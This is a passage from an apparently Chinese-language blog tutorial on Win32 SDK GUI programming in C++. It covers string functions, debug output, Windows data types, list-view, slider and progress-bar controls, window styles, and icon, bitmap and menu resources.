class="line">HBITMAP hBit_map = <span class="built_in">LoadBitmap</span>(g_hInstance, <span class="built_in">MAKEINTRESOURCE</span>(IDB_BITMAP1));</span><br><span class="line">HWND hPic=<span class="built_in">GetDlgItem</span>(hMain, IDC_STATIC1);<span class="comment">//获取图片框资源句柄</span></span><br><span class="line"><span class="built_in">SendMessage</span>(hPic, STM_SETIMAGE, IMAGE_BITMAP, (LPARAM)hBit_map);</span><br><span class="line"><span class="comment">//2，初始化列表</span></span><br><span class="line"><span class="comment">//////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="comment">//1. 获取列表框的句柄</span></span><br><span class="line">HWND hListCtrl = <span class="built_in">GetDlgItem</span>(hMain, IDC_LIST3);</span><br><span class="line"><span class="built_in">ListView_SetExtendedListViewStyle</span>(hListCtrl, LVS_EX_CHECKBOXES | LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES);</span><br><span class="line"><span class="comment">//添加第一列</span></span><br><span class="line">LVCOLUMN lv = &#123;&#125;;</span><br><span class="line">lv.mask = LVCF_FMT | LVCF_WIDTH | LVCF_TEXT;</span><br><span class="line">lv.cx = <span class="number">112</span>;<span class="comment">//112正好对应该窗口的宽度为4列</span></span><br><span class="line">lv.pszText = (TCHAR*)_T(<span class="string">&quot;年份&quot;</span>);</span><br><span class="line">lv.fmt = LVCFMT_CENTER;</span><br><span class="line"><span class="built_in">ListView_InsertColumn</span>(hListCtrl, <span class="number">0</span>, &amp;lv);</span><br><span class="line"><span class="comment">//添加第二列</span></span><br><span class="line">lv.pszText = (TCHAR*)_T(<span class="string">&quot;时间&quot;</span>);</span><br><span class="line"><span class="built_in">ListView_InsertColumn</span>(hListCtrl, <span class="number">1</span>, &amp;lv);</span><br><span class="line"><span class="comment">//添加第三列</span></span><br><span class="line">lv.pszText = (TCHAR*)_T(<span class="string">&quot;经历&quot;</span>);</span><br><span class="line"><span class="built_in">ListView_InsertColumn</span>(hListCtrl, <span class="number">2</span>, &amp;lv);</span><br><span class="line"><span class="comment">//添加第四列</span></span><br><span class="line">lv.pszText = (TCHAR*)_T(<span class="string">&quot;备注&quot;</span>);</span><br><span class="line"><span class="built_in">ListView_InsertColumn</span>(hListCtrl, <span class="number">3</span>, &amp;lv);</span><br><span class="line"></span><br><span class="line">LVITEM  li = &#123;&#125;;</span><br><span class="line">li.mask = LVIF_TEXT;</span><br><span class="line">li.iItem = <span class="number">0</span>;</span><br><span class="line">li.pszText = (TCHAR*)_T(<span class="string">&quot;2009&quot;</span>);</span><br><span class="line"><span class="comment">//添加一行，但是没有设置本行单元格的内容</span></span><br><span class="line"><span class="built_in">ListView_InsertItem</span>(hListCtrl, &amp;li);</span><br><span class="line"><span class="comment">//要设置单元格的内容</span></span><br><span class="line"><span class="built_in">ListView_SetItemText</span>(hListCtrl, <span class="number">0</span>, <span class="number">1</span>, (TCHAR*)_T(<span class="string">&quot;9月5日&quot;</span>));</span><br><span class="line"><span class="built_in">ListView_SetItemText</span>(hListCtrl, <span class="number">0</span>, <span class="number">2</span>, (TCHAR*)_T(<span class="string">&quot;清华大学附中就读&quot;</span>));</span><br><span class="line"><span class="built_in">ListView_SetItemText</span>(hListCtrl, <span class="number">0</span>, <span class="number">3</span>, (TCHAR*)_T(<span class="string">&quot;班长一职&quot;</span>));</span><br><span class="line"><span class="comment">//添加第二行</span></span><br><span class="line">li.mask = LVIF_TEXT;</span><br><span class="line">li.iItem = <span class="number">1</span>;</span><br><span class="line">li.pszText = (TCHAR*)_T(<span class="string">&quot;2001&quot;</span>);</span><br><span class="line"><span class="comment">//添加一行，但是没有设置本行单元格的内容</span></span><br><span class="line"><span class="built_in">ListView_InsertItem</span>(hListCtrl, &amp;li);</span><br><span class="line"><span class="comment">//要设置单元格的内容</span></span><br><span class="line"><span class="built_in">ListView_SetItemText</span>(hListCtrl, <span class="number">1</span>, <span class="number">1</span>, (TCHAR*)_T(<span class="string">&quot;9月5日&quot;</span>));</span><br><span class="line"><span class="built_in">ListView_SetItemText</span>(hListCtrl, <span class="number">1</span>, <span class="number">2</span>, (TCHAR*)_T(<span class="string">&quot;清华大学&quot;</span>));</span><br><span class="line"><span class="built_in">ListView_SetItemText</span>(hListCtrl, <span class="number">1</span>, <span class="number">3</span>, (TCHAR*)_T(<span class="string">&quot;学生会主席&quot;</span>));</span><br><span class="line"><span class="comment">////////////////////////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">ShowWindow</span>(hMain, SW_SHOW);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">_stprintf_s(C_MAX, _T(<span class="string">&quot;账号或密码错误，请确认！\n\t账号：%s\n\t密码：%s&quot;</span>), c_User, c_Passwd);</span><br><span class="line"><span class="built_in">MessageBox</span>(hWnd, C_MAX, <span class="string">L&quot;提示&quot;</span>, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> WM_NOTIFY:</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//1. 先获取小结构体中的信息，做大致判断</span></span><br><span class="line">LPNMHDR pNm = (LPNMHDR)lParam;</span><br><span class="line"><span class="keyword">if</span> (pNm-&gt;idFrom == IDC_LIST3 &amp;&amp; pNm-&gt;code == NM_CLICK)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> WM_RBUTTONDOWN:</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//手动回调</span></span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">WndPorc</span><span class="params">(HWND hWnd, UINT Message, WPARAM wParam, LPARAM lParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//将不想处理的消息传递给这个函数，进行默认参数</span></span><br><span class="line"><span class="keyword">return</span> <span class="built_in">DefWindowProc</span>(hWnd, Message, wParam, lParam);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="三、SDK详解"><a href="#三、SDK详解" class="headerlink" title="三、SDK详解"></a>三、SDK详解</h1><h2 id="常用字符串处理函数"><a href="#常用字符串处理函数" class="headerlink" title="常用字符串处理函数"></a>常用字符串处理函数</h2><div class="table-container"><table><thead><tr><th></th><th>ASCLL版</th><th>UNICODE版</th><th>T版</th></tr></thead><tbody><tr><td>获取长度</td><td>strlen</td><td>wcsnlen</td><td>_tcslen</td></tr><tr><td>字符串拷贝</td><td>strcpy_s</td><td>wcscpy_s</td><td>_tcscpy_s</td></tr><tr><td>字符转数字</td><td>atoi</td><td>_wtoi</td><td>_tstoi</td></tr><tr><td>字符转数字</td><td>sscanf_s</td><td>swscanf_s</td><td>_stscanf_s</td></tr><tr><td>数字转字符</td><td>sprintf_s</td><td>swprintf_s</td><td>_stprintf_s</td></tr></tbody></table></div><h2 id="调试输出"><a href="#调试输出" class="headerlink" title="调试输出"></a>调试输出</h2><p>变参函数，用于在输出款输出信息</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> _trace(<span class="type">const</span> TCHAR* format, ...) </span><br><span class="line">&#123;</span><br><span class="line">  TCHAR buffer[<span class="number">1000</span>];</span><br><span class="line">  va_list argprt;</span><br><span class="line">  <span class="built_in">va_start</span>(argprt, format);</span><br><span class="line">  <span class="comment">//将格式化信息写入指定缓冲区</span></span><br><span class="line">  <span class="built_in">wvsprintf</span>(buffer, format, argprt);</span><br><span class="line">  <span class="built_in">va_end</span>(argprt);</span><br><span class="line">  <span class="comment">//将缓冲区信息输出</span></span><br><span class="line">  <span class="built_in">OutputDebugString</span>(buffer);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一天所用例题</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> _trace(<span class="type">const</span> TCHAR* format, ...) <span class="comment">//变参函数</span></span><br><span class="line">&#123;</span><br><span class="line">TCHAR buffer[<span class="number">1000</span>];</span><br><span class="line">va_list argptr;</span><br><span class="line"><span class="built_in">va_start</span>(argptr, format);</span><br><span class="line"><span class="comment">//将格式化信息写入指定的缓冲区</span></span><br><span class="line"><span class="built_in">wvsprintf</span>(buffer, format, argptr);</span><br><span class="line"><span class="built_in">va_end</span>(argptr);</span><br><span class="line"><span class="comment">//将缓冲区信息输出</span></span><br><span class="line"><span class="built_in">OutputDebugString</span>(buffer);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">MyMessageBox</span><span class="params">(<span class="type">const</span> TCHAR* format, ...)</span> <span class="comment">//变参函数</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">TCHAR buffer[<span class="number">1000</span>];</span><br><span class="line">va_list argptr;</span><br><span class="line"><span class="built_in">va_start</span>(argptr, format);</span><br><span class="line"><span class="comment">//将格式化信息写入指定的缓冲区</span></span><br><span class="line"><span class="built_in">wvsprintf</span>(buffer, format, argptr);</span><br><span class="line"><span class="built_in">va_end</span>(argptr);</span><br><span class="line"><span class="comment">//将缓冲区信息输出</span></span><br><span class="line"><span class="built_in">MessageBox</span>(<span class="number">0</span>,buffer,_T(<span class="string">&quot;提示&quot;</span>),<span class="number">1</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">MyGetErrorInfo</span><span class="params">(LPCTSTR lpErrInfo,</span></span></span><br><span class="line"><span class="params"><span class="function">UINT unErrCode,</span></span></span><br><span class="line"><span class="params"><span class="function">UINT unLine)</span> <span class="comment">// unLine=__LINE__</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">LPTSTR lpMsgBuf = <span class="literal">nullptr</span>;</span><br><span class="line">WCHAR  szMessage[<span class="number">128</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">WCHAR  szCaption[<span class="number">32</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">FormatMessage</span>(<span class="number">0x1300</span>, <span class="literal">NULL</span>, unErrCode,</span><br><span class="line"><span class="number">0x400</span>, (LPTSTR)&amp;lpMsgBuf, <span class="number">64</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">swprintf_s</span>(szMessage, <span class="number">128</span>,</span><br><span class="line"><span class="string">L&quot;Error_0x%08X:%s&quot;</span>, unErrCode, lpMsgBuf);</span><br><span class="line"></span><br><span class="line"><span class="built_in">swprintf_s</span>(szCaption, <span class="number">32</span>,</span><br><span class="line"><span class="string">L&quot;%s (Error Line:%05d)&quot;</span>, lpErrInfo, unLine);</span><br><span class="line"><span class="built_in">MessageBox</span>(<span class="literal">NULL</span>, szMessage, szCaption, MB_OK);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> APIENTRY <span class="title">WinMain</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">HINSTANCE hInstance,</span></span></span><br><span class="line"><span class="params"><span class="function">HINSTANCE hPreInstance,</span></span></span><br><span class="line"><span class="params"><span class="function">LPSTR  lpCmdLine,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="type">int</span> nShow</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">OutputDebugString</span>(_T(<span class="string">&quot;你好 呵呵&quot;</span>));</span><br><span class="line"></span><br><span class="line">_trace(_T(<span class="string">&quot;有两个数，分别是%d和%s&quot;</span>), <span class="number">100</span>, <span class="string">L&quot;你好&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">MyMessageBox</span>(_T(<span class="string">&quot;有两个数，分别是%d和%s&quot;</span>), <span class="number">100</span>, <span class="string">L&quot;你好&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//GetStdHandle(STD_OUTPUT_HANDLE);</span></span><br><span class="line">HANDLE hOut = <span class="built_in">GetStdHandle</span>(<span class="number">100</span>);</span><br><span class="line"><span class="type">int</span> nError = <span class="built_in">GetLastError</span>();</span><br><span class="line">nError = <span class="number">10</span>;</span><br><span class="line"><span class="built_in">MyGetErrorInfo</span>(<span class="string">L&quot;十五派友情提示&quot;</span>, nError, __LINE__);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><p>常用数据类型</p><div class="table-container"><table><thead><tr><th>Windows 数据类型</th><th>描述信息</th></tr></thead><tbody><tr><td>UINT</td><td>无符号32位整数</td></tr><tr><td>DWORD</td><td>整数</td></tr><tr><td>PDWORD</td><td>指向32位值的指针</td></tr><tr><td>BOOL</td><td>布尔（true/false）</td></tr><tr><td>SHORT</td><td>带符号16位整数</td></tr><tr><td>LPSTR</td><td>字符串指针</td></tr><tr><td>LPCSTR</td><td>字符串常量指针</td></tr><tr><td>WPARAM</td><td>32位的消息参数</td></tr><tr><td>LPARAM</td><td>32位的消息参数</td></tr><tr><td>LRESULT</td><td>32位函数返回值</td></tr><tr><td>HWND</td><td>窗口句柄</td></tr></tbody></table></div><h2 id="常用控件"><a href="#常用控件" class="headerlink" title="常用控件"></a>常用控件</h2><h3 id="标准控件"><a href="#标准控件" class="headerlink" title="标准控件"></a>标准控件</h3><p>响应消息：WM_COMMAND</p><p>控件时常见的窗口上的交互元素</p><p>当控件的特定功能被触发后，会主动发消息通知父窗口</p><p>父窗口可以通过发消息给控件</p><p>例如：控件的创建（button时按钮控件）</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">CreateWindow</span>(<span class="string">L&quot;button&quot;</span>, <span class="string">L&quot;控件名&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="number">280</span>, <span class="number">440</span>, <span class="number">80</span>, <span class="number">50</span>, hwnd, (HMENU)<span class="number">0x10016</span>, hInstance, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure><p>标准控件时windows提供的基本控件，使用方式也比较简单，一下时常用的标准控件</p><div class="table-container"><table><thead><tr><th>窗口类名</th><th>控件名</th><th>英文</th></tr></thead><tbody><tr><td>“button”</td><td>按钮</td><td>Button</td></tr><tr><td>“button”</td><td>复选框</td><td>CheckBox</td></tr><tr><td>“button”</td><td>单选框</td><td>RadioButton</td></tr><tr><td>“static”</td><td>静态文本</td><td>Static Text</td></tr><tr><td>“static”</td><td>图片</td><td>Picture Control</td></tr><tr><td>“combobox”</td><td>复合框</td><td>ComBox</td></tr><tr><td>“edit”</td><td>编辑</td><td>Edit</td></tr><tr><td><strong>“listbox”</strong></td><td><strong>列表框</strong></td><td><strong>ListBox</strong></td></tr></tbody></table></div><p>滚动条 Slider Control控件</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> WM_HSCROLL:<span class="comment">//当水平的滑块滑动时，会产生这个消息</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> nPos = <span class="number">0</span>;</span><br><span class="line"><span class="comment">//1. 先获取滑块的句柄</span></span><br><span class="line">HWND hSlider = <span class="built_in">GetDlgItem</span>(hWnd, IDC_SLIDER1);</span><br><span class="line"><span class="comment">//2. 给滑块发消息 接收滑块移动的位置</span></span><br><span class="line">nPos = <span class="built_in">SendMessage</span>(hSlider, TBM_GETPOS, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//给滑块发消息，滑块句柄， 消息类型，   重绘，进度位置</span></span><br><span class="line"><span class="comment">//SendMessage(hSlider, TBM_SETPOS, true, 0);</span></span><br></pre></td></tr></table></figure><p>进度条</p><p>响应的还是WM_COMMAND消息，这个消息的WPARAM的低位时控件ID</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> nPos = <span class="number">0</span>;</span><br><span class="line"><span class="comment">//1. 获取进度条控件的句柄</span></span><br><span class="line">HWND hProcess = <span class="built_in">GetDlgItem</span>(hWnd, IDC_PROGRESS1);</span><br><span class="line"></span><br><span class="line"><span class="comment">//2. 给进度条控件发消息，设置进度</span></span><br><span class="line"><span class="built_in">SendMessage</span>(hProcess, PBM_SETPOS, nPos, <span class="number">0</span>);</span><br><span class="line">nPos += <span class="number">20</span>;</span><br><span class="line"><span class="keyword">if</span> (nPos&gt;<span class="number">100</span>)</span><br><span class="line">&#123;</span><br><span class="line">nPos = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="通用控件"><a href="#通用控件" class="headerlink" title="通用控件"></a>通用控件</h3><div class="table-container"><table><thead><tr><th>窗口类名</th><th>控件</th></tr></thead><tbody><tr><td>WC_LISTVIEW</td><td>列表框控件</td></tr><tr><td>WC_TREEVIEW</td><td>树控件</td></tr><tr><td>WC_TABCONTROL</td><td>Tab控件</td></tr><tr><td>HOTLEY_CLASS</td><td>热键控件</td></tr></tbody></table></div><p>列表框控件的创建</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//根据ID获取列表框控件的句柄</span></span><br><span class="line">HWND hListCtrl = <span class="built_in">GetDlgItem</span>(hMain, IDC_LIST3);</span><br><span class="line"><span class="comment">//更改列表框的风格</span></span><br><span class="line"><span class="built_in">ListView_SetExtendedListViewStyle</span>(hListCtrl, LVS_EX_CHECKBOXES | LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES);</span><br><span class="line"><span class="comment">//添加第一列</span></span><br><span class="line">LVCOLUMN lv = &#123;&#125;;</span><br><span class="line">lv.mask = LVCF_FMT | LVCF_WIDTH | LVCF_TEXT;</span><br><span class="line">lv.cx = <span class="number">112</span>;<span class="comment">//112正好对应该窗口的宽度为4列</span></span><br><span class="line">lv.pszText = (TCHAR*)_T(<span class="string">&quot;年份&quot;</span>);</span><br><span class="line">lv.fmt = LVCFMT_CENTER;</span><br><span class="line"><span class="built_in">ListView_InsertColumn</span>(hListCtrl, <span class="number">0</span>, &amp;lv);</span><br><span class="line"><span class="comment">//添加第二列</span></span><br><span class="line">lv.pszText = (TCHAR*)_T(<span class="string">&quot;时间&quot;</span>);</span><br><span class="line"><span class="built_in">ListView_InsertColumn</span>(hListCtrl, <span class="number">1</span>, &amp;lv);</span><br><span class="line"><span class="comment">//添加第三列</span></span><br><span class="line">lv.pszText = (TCHAR*)_T(<span class="string">&quot;经历&quot;</span>);</span><br><span class="line"><span class="built_in">ListView_InsertColumn</span>(hListCtrl, <span class="number">2</span>, &amp;lv);</span><br><span class="line"><span class="comment">//添加第四列</span></span><br><span class="line">lv.pszText = (TCHAR*)_T(<span class="string">&quot;备注&quot;</span>);</span><br><span class="line"><span class="built_in">ListView_InsertColumn</span>(hListCtrl, <span class="number">3</span>, &amp;lv);</span><br><span class="line"></span><br><span class="line">LVITEM  li = &#123;&#125;;</span><br><span class="line">li.mask = LVIF_TEXT;</span><br><span class="line">li.iItem = <span class="number">0</span>;</span><br><span class="line">li.pszText = (TCHAR*)_T(<span class="string">&quot;2009&quot;</span>);</span><br><span class="line"><span class="comment">//添加一行，但是没有设置本行单元格的内容</span></span><br><span class="line"><span class="built_in">ListView_InsertItem</span>(hListCtrl, &amp;li);</span><br><span class="line"><span class="comment">//要设置单元格的内容</span></span><br><span class="line"><span class="built_in">ListView_SetItemText</span>(hListCtrl, <span class="number">0</span>, <span class="number">1</span>, (TCHAR*)_T(<span class="string">&quot;9月5日&quot;</span>));</span><br><span class="line"><span class="built_in">ListView_SetItemText</span>(hListCtrl, <span class="number">0</span>, <span class="number">2</span>, (TCHAR*)_T(<span class="string">&quot;清华大学附中就读&quot;</span>));</span><br><span class="line"><span class="built_in">ListView_SetItemText</span>(hListCtrl, <span class="number">0</span>, <span class="number">3</span>, (TCHAR*)_T(<span class="string">&quot;班长一职&quot;</span>));</span><br><span class="line"><span class="comment">//添加第二行</span></span><br><span class="line">li.mask = LVIF_TEXT;</span><br><span class="line">li.iItem = <span class="number">1</span>;</span><br><span class="line">li.pszText = (TCHAR*)_T(<span class="string">&quot;2001&quot;</span>);</span><br><span class="line"><span class="comment">//添加一行，但是没有设置本行单元格的内容</span></span><br><span class="line"><span class="built_in">ListView_InsertItem</span>(hListCtrl, &amp;li);</span><br><span class="line"><span class="comment">//要设置单元格的内容</span></span><br><span class="line"><span class="built_in">ListView_SetItemText</span>(hListCtrl, <span class="number">1</span>, <span class="number">1</span>, (TCHAR*)_T(<span class="string">&quot;9月5日&quot;</span>));</span><br><span class="line"><span class="built_in">ListView_SetItemText</span>(hListCtrl, <span class="number">1</span>, <span class="number">2</span>, (TCHAR*)_T(<span class="string">&quot;清华大学&quot;</span>));</span><br><span class="line"><span class="built_in">ListView_SetItemText</span>(hListCtrl, <span class="number">1</span>, <span class="number">3</span>, (TCHAR*)_T(<span class="string">&quot;学生会主席&quot;</span>));</span><br></pre></td></tr></table></figure><h2 id="窗口风格"><a href="#窗口风格" class="headerlink" title="窗口风格"></a>窗口风格</h2><p>响应消息：WM_NOTIFY</p><p>窗口标准风格之</p><h3 id="三大窗口风格"><a href="#三大窗口风格" class="headerlink" title="三大窗口风格"></a>三大窗口风格</h3><div class="table-container"><table><thead><tr><th>重叠窗口</th><th>弹出窗口</th><th>子窗口</th></tr></thead><tbody><tr><td>WS_OVERLAPPEDWINODW</td><td>WS_POPUPWINDOW</td><td>WS_CHILDWINDOW</td></tr></tbody></table></div><h3 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h3><div class="table-container"><table><thead><tr><th>函数名</th><th>说明</th></tr></thead><tbody><tr><td>CreateWindow</td><td>使用窗口类，创建窗口，创建控件</td></tr><tr><td>RegisterClass</td><td>注册窗口类</td></tr><tr><td>DialogBox</td><td>使用资源创建一个模态对话框</td></tr><tr><td>MoveWindow</td><td>移动窗口到指定位置</td></tr><tr><td>ShowWIndow</td><td>隐藏（SW_HWID）或显示(SW_SHOW)窗口</td></tr><tr><td>GetWindowText</td><td>获取窗口标题</td></tr><tr><td>SetWindowText</td><td>设置窗口标题</td></tr><tr><td>SetParent</td><td>更改指定窗口的父窗口</td></tr><tr><td>TrackPopupMeun</td><td>弹出菜单（坐标需要转换，需要获取子菜单的句柄）</td></tr><tr><td>GetSubMenu</td><td>获取指定子菜单的句柄</td></tr><tr><td>GetDlgItem</td><td>根据控件的ID获取子控件句柄</td></tr><tr><td>GetParent</td><td>获取父窗口句柄</td></tr><tr><td>FindWindow</td><td>找到一个窗口，获取其句柄</td></tr><tr><td></td></tr></tbody></table></div><h2 id="常用资源"><a href="#常用资源" class="headerlink" title="常用资源"></a>常用资源</h2><p>想要操作资源需先获得资源的句柄</p><h3 id="图标-Icon"><a href="#图标-Icon" class="headerlink" title="图标 Icon"></a>图标 Icon</h3><ul><li>需要有一个图标资源</li><li>LoadIcon根据资源ID得到句柄</li><li>将句柄填充到窗口类上</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HBITMAP hBit_map = <span class="built_in">LoadBitmap</span>(g_hInstance, <span class="built_in">MAKEINTRESOURCE</span>(IDB_BITMAP1));</span><br><span class="line">HWND hPic=<span class="built_in">GetDlgItem</span>(hMain, IDC_STATIC1);<span class="comment">//获取图片框资源句柄</span></span><br><span class="line"><span class="built_in">SendMessage</span>(hPic, STM_SETIMAGE, IMAGE_BITMAP, (LPARAM)hBit_map);</span><br></pre></td></tr></table></figure><h3 id="光标-Cursor"><a href="#光标-Cursor" class="headerlink" title="光标 Cursor"></a>光标 Cursor</h3><ul><li>需要有一个光标资源</li><li>LoadCursor根据ID得到句柄</li><li>将句柄填充到窗口类上</li></ul><h3 id="位图"><a href="#位图" class="headerlink" title="位图"></a>位图</h3><ul><li>配合picture控件使用</li></ul><h3 id="菜单"><a href="#菜单" class="headerlink" title="菜单"></a>菜单</h3><ul><li>下拉菜单<ul><li>有一个菜单资源<ul><li>填充到窗口类中 直接填</li><li>填充到创建窗口的参数上，需要LoadMenu获取到句柄</li></ul></li></ul></li><li>弹出菜单<ul><li>TrackPopupMenu 提供坐标以及菜单的句柄</li></ul></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> WM_RBUTTONDOWN:</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//这里得到的是窗口坐标</span></span><br><span class="line">DWORD dwX = <span class="built_in">LOWORD</span>(lParam);</span><br><span class="line">DWORD dwY = <span class="built_in">HIWORD</span>(lParam);</span><br><span class="line"><span 